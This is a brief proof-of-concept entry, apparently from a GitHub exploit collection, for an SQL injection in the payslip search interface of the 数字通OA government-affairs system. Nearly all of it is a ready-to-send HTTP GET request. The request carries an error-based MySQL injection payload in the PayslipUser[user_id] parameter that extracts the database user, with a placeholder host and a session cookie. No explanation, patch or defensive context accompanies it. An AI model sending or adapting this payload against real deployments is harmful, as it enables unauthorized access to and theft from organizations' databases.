# szt_payslip_sqli

from: https://github.com/wy876/POC/blob/main/%E6%95%B0%E5%AD%97%E9%80%9AOA-%E6%99%BA%E6%85%A7%E6%94%BF%E5%8A%A1%E6%8E%A5%E5%8F%A3payslip%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md

```
GET /payslip/search/index/userid/time/time?PayslipUser[user_id]=(SELECT 4050 FROM(SELECT COUNT(*),CONCAT((mid((ifnull(cast(current_user() as nchar),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: GOASESSID=i589f58naalabocmbidup7edl3
Upgrade-Insecure-Requests: 1
```
